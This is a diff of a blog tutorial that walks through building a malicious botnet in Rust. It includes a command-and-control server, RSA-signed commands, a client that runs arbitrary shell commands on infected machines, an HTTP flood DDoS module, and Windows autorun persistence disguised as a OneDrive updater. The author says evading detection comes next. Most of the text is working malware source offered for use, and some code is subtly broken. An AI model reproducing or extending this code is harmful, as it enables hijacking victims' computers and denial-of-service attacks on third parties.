@@ -10,7 +10,8 @@ my Rust skills are better-than-none, I feel confident in my ability to make a co
 
 # The Basics
 
-What is a botnet? How might I get started. A botnet, if you didn't know, is really just a network of computers controlled by some other computer/computers.
+A botnet, if you didn't know, is really just a network of computers controlled by some other computer/computers. This network can be used for many things, but in this article we will design
+a classic malicious botnet to run commands on victim machines (think DDoS, Bitcoin mining, etc).
 In this tutorial, I will create a botnet with a really easy server/client model, where every infected machine reports to one central server for commands. Sounds easy enough, right?
 
 > All the code in this tutorial assumes that you are semi-competent at Rust. There is nothing crazy or too out there, but you should be familiar with the Tokio RunTime and Async.
@@ -36,7 +37,7 @@ let listener = TcpListener::bind("0.0.0.0:8080").await? // Get a TcpListener on 
 
         tokio::spawn(async move{
             handle_conn(socket).await;
-        })
+        });
     }
 
 }
@@ -169,10 +170,11 @@ async fn main() -> Result<(), Box<dyn Error>> {
 
     loop {
         let (socket, _) = listener.accept().await?;
+        let a = Arc::clone(&args);
 
         tokio::spawn(async move{
-            handle_conn(socket).await;
-        })
+            handle_conn(socket, a).await;
+        });
     }
 
 }
@@ -209,3 +211,330 @@ There are obviously alternatives to this solution, this is just how I am impleme
 Do what you want for this.
 
 # Authentication
+
+We have a solid channel set up for communications, but how do we ensure that messages being sent to the network areactually from you?
+It could be pretty bad if just anyone could tell your botnet to do something, so we need some form of authentication from the server to the client. There are some
+requirements when it comes to authentication here, mainly a client should be able to verify a message is from the legitimate control server, while not being given enough information
+to *impersonate* the control server.
+
+RSA is our answer. For those completely unfamiliar, RSA is an asymmetric encyption scheme, meaning that a private key and public key cannot work interchangably. A private key (kept private) is used to encrypt and a public key is used to decrypt or vice versa. Importantly, the private key must be private because a valid public key can be generated from a private key, and the same is not true the other way around. What is my whole point? We can verify a message senders integrity if they sign a message with the private key which we know only they have.
+
+This method of verifying sender integrity is called *signing* a message. The specifics don't matter that much to use because there is a very nice RSA crate in Rust that we can use. Let's start with the server.
+
+> Small detail, you will need to generate a pkcs1 PEM to use here. This can be done on websites, openssl, or some script made to do this.
+
+{% highlight rust %}
+
+// Pretend we have all of the other stuff we have done.
+// Starting at main so we can pass the private key to all
+// the connection tasks.
+
+use rsa::pkcs1v15::{SigningKey, Signature};
+use rsa::RsaPrivateKey;
+use rsa::signature::{RandomizedSigner, SignatureEncoding, Verifier};
+use rsa::sha2::{Digest, Sha256};
+use rsa::pkcs1::DecodeRsaPrivateKey;
+use rand; // HUGE IMPORTANT NOTE! You need rand version 0.8.0
+          // For this to work.
+
+const PRIVATE_PEM: &str = "Key";
+
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn Error>> {
+    let listener = TcpListener::bind("0.0.0.0:8080").await?; // Get a TcpListener on port 8080
+    let args: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(std::env::args().collect()));
+
+    let private_key = RsaPrivateKey::from_pkcs1_pem(PRIVATE_PEM).expect("Could not get private key");
+    let signing_key: Arc<Mutex<SigningKey<Sha256>>> = Arc::new(Mutex::new(SigningKey::<Sha256>::new(private_key)));
+
+    loop {
+        let (socket, _) = listener.accept().await?;
+        let a = Arc::clone(&args);
+        let s = Arc::clone(&signing_key);
+        tokio::spawn(async move{
+            handle_conn(socket, a, s).await;
+        });
+    }
+
+}
+
+async fn handle_conn(mut stream: TcpStream, args: Arc<Mutex<Vec<String>>>, signing_key: Arc<Mutex<SigningKey<Sha256>>>) {
+    let (mut reader, mut writer) = stream.split();
+
+    let mut buf = vec![0u8; 1024];
+    let n = reader.read(&mut buf).await.expect("Failed to read from reader");
+    println!("Recieved from client: {}", String::from_utf8_lossy(&buf[..]));
+
+    for (index, val) in buf.iter_mut().enumerate() {
+        *val = 0;
+    }
+
+    let arg;
+    {
+        arg = args.lock().unwrap().get(1).expect("No Args").clone();
+    }
+
+    arg.into_bytes().iter().enumerate().for_each(|index, &val| {
+        buf[index] = val;
+    });
+    
+    let signed_message;
+    {
+        let signing_key = signing_key.lock().unwrap();
+        let mut rng = rand::thread_rng();
+        signed_message = signing_key.sign_with_rng(&mut rng, &buf[..]).to_bytes();
+    }
+
+    writer.write_all(&buf[..]).await.expect("Writer Failed");
+    writer.write_all(&signed_message[..]).await.expect("Writer Failed");
+
+    writer.shutdown().await;
+
+}
+
+{% endhighlight %}
+
+If you're observant, you might now understand why it's a good idea to set a fixed amount of bytes to be sent over the wire. Because a socket really just acts like a file,
+a single call to read on the client could read the message **AND** the signature! This would of course cause problems. With our current design, we know that the clear-text is 1024 bytes
+and the signature is 256 bytes (a feature of hashing with Sha256), stopping this annoying bug.
+
+Let's verify the message on the client.
+
+{% highlight rust %}
+
+// Everything else is the same, added changes.
+
+use rsa::pkcs1::DecodeRsaPublicKey;
+use rsa::pkcs1v15::{Signature, VerifyingKey};
+use rsa::sha2::Sha256;
+use rsa::signature::Verifier;
+use rsa::RsaPublicKey;
+
+const PUBLIC_PEM: &str = "Key";
+
+#[tokio::main]
+async fn main() {
+
+    let public_key = RsaPublicKey::from_pkcs1_pem(PUBLIC_PEM).unwrap();
+    let verify_key = VerifyingKey::<Sha256>::new(public_key);
+
+    loop {
+        sleep(Duration::from_millis(5000)).await;
+
+        let mut stream = get_stream().await;
+        let (mut reader, mut writer) = stream.split();
+
+        if let Err(_) = writer.write_all(b"Hello!").await {
+            let _ = writer.shutdown().await;
+            continue;
+        }
+
+        let mut buf = vec![0u8; 1024];
+
+        // Message
+
+        let message_length = match reader.read_exact(&mut buf).await {
+            Ok(n) => n,
+            Err(_) => {
+                let _ = writer.shutdown().await;
+                continue;
+            }
+        };
+
+        // Signed Message
+
+        let mut signature_buf = vec![0u8; 256];
+
+        if let Err(_) = reader.read(&mut signature_buf).await {
+            let _ = writer.shutdown().await;
+        }
+
+        // Get Signature struct
+        let signature =
+            Signature::try_from(&signature_buf[..]).expect("Failed to get signature from bytes"); // Important that this buf is 256 bytes!
+
+        // Compare hashes!
+        if let Err(e) = verify_key.verify(&buf[..message_length], &signature) {
+            eprintln!("{}", e);
+            continue;
+        }
+
+        let command = match String::from_utf8(buf) {
+            Ok(c) => c,
+            Err(_) => continue,
+        };
+
+        let command = command.trim_matches(char::from(0)); // Our final message, assuming it was validated!
+    }
+}
+
+{% endhighlight %}
+
+> When I first started making this, I had huge problems with signing because I was signing
+empty bytes and then verifying against a message without those empty bytes at the end. If you try something different
+and get verification errors, make sure you are trying to verify the exact same bytes.
+
+> You are probably noticing how messy this main function is getting. Feel free to clean it up, but this will be the last of the clutter.
+Executing commands will be delegated to its own function and the commands themselves will be functions in a seperate module.
+
+# Executing Commands
+
+If you have your own ideas for this, this is where you can drop off. You have a system for distributing commands as a string to your clients, go wild. If you want the way I'm doing this,
+stick around. Also, everything from now on will be focused on the client. Make the server as fancy as you want but that's where I'm stopping for now.
+
+Let's make a function to handle a command.
+
+{% highlight rust %}
+
+pub mod commands;
+
+async fn handle_command(command: &str) {
+    let (command, args) = match command.split_once(" ") {
+        Some((c, a)) => (c, a),
+        None => (&command[..], ""),
+    };
+
+    // I keep the args as a string slice so that I can choose to use custom syntax for commands later
+    // Do what you want here
+
+    match command {
+        "cmd" => {
+            println!("Command running!");
+            if cfg!(target_os = "windows") {
+                Command::new("cmd")
+                    .args(["/C", args])
+                    .spawn()
+                    .expect("Command err");
+            } else {
+                Command::new("sh")
+                    .arg("-c")
+                    .arg(args)
+                    .spawn()
+                    .expect("Command err");
+            }
+        }
+        "httpddos" => {
+            let mut args = args.split(" ");
+
+            let url = match args.next() {
+                Some(u) => u.to_string(),
+                None => return, // need url
+            };
+
+            let duration = match args.next() {
+                Some(d) => Duration::from_secs(d.parse().unwrap_or(300)),
+                None => return,
+            };
+
+            commands::ddos(url, duration).await;
+        }
+        &_ => (),
+    }
+}
+
+{% endhighlight %}
+
+What I'm doing here is very simple, I match the command and do what I want to with the args.
+
+Here is the commands.rs module.
+
+{% highlight rust %}
+
+use reqwest;
+use std::sync::{Arc, Mutex};
+use tokio::time::{sleep, Duration};
+
+pub async fn ddos(url: String, time: Duration) {
+    let mut tasks = Vec::new();
+
+    let url = Arc::new(Mutex::new(url));
+
+    for _ in 1..100 {
+        let u = Arc::clone(&url);
+
+        let t = tokio::spawn(async move {
+            let client = reqwest::Client::new();
+
+            let url: String = { u.lock().unwrap().clone() };
+
+            loop {
+                let _ = client.get(&url).send().await;
+            }
+        });
+
+        tasks.push(t);
+    }
+
+    let _ = tokio::spawn(async move {
+        sleep(time).await;
+
+        tasks.iter().for_each(|task| {
+            task.abort();
+        });
+    });
+}
+
+{% endhighlight %}
+
+You should now see how you can implement your own commands!
+
+# Persistence Specifically on Windows
+
+I tend to target Windows machines when I make these projects, and while this will compile and run and any sort of machine that Rust can compile to,
+I added features that allow this to infect Windows machines and conditonal compilation. For this, I made a function to use for Windows.
+
+{% highlight rust %}
+
+#[cfg(target_os = "windows")]
+use winreg::enums::*;
+#[cfg(target_os = "windows")]
+use winreg::RegKey;
+
+async fn get_persistence() {
+    if cfg!(target_os = "windows") {
+        // Makes an autostart registry key
+        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+        let path = Path::new("Software")
+            .join("Microsoft")
+            .join("Windows")
+            .join("CurrentVersion")
+            .join("Run");
+        let (key, _disp) = hkcu.create_subkey(&path).unwrap();
+
+        let name;
+        if let Some(n) = env::args().next() {
+            name = n;
+        } else {
+            return;
+        }
+
+        let userdirs;
+        if let Some(u) = UserDirs::new() {
+            userdirs = u;
+        } else {
+            eprintln!("Failed to get userdir");
+            return;
+        }
+
+        let mut newdir = userdirs.home_dir().join("onedrivedaemon");
+        newdir.set_extension("exe");
+
+        let _ = std::fs::copy(&name, &newdir);
+
+        let os_string = newdir.into_os_string();
+        if let Err(_) = key.set_value("OneDriveUpdater", &os_string) {
+            return;
+        }
+    }
+}
+
+{% endhighlight %}
+
+This simply copies the file to a new name in the user AppData, and then adds it to the autorun registry key. Perfect!
+
+# Conclusion
+
+This project is obviously far from complete! There are many edge cases and things you would want to implement for an actual botnet! However, this is a solid base. Things I would target next
+would be efficiency, server detection evasion, and probably something more I'm not thinking of.
+
+Be safe!
